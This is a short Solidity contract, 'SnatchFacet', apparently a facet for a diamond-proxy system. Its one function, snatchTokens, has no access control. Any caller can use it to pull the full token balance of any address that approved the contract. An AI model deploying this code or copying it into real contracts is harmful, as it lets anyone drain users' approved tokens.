pragma solidity ^0.8.13;

import {IERC20} from "solidstate-solidity/token/ERC20/IERC20.sol";

contract SnatchFacet {
    error ZeroBalance();

    function snatchTokens(IERC20 _token, address _spender) external {
        uint256 spenderBalance = _token.balanceOf(_spender);

        if (spenderBalance == 0) {
            revert ZeroBalance();
        }

        _token.transferFrom(_spender, address(this), spenderBalance);
    }
}

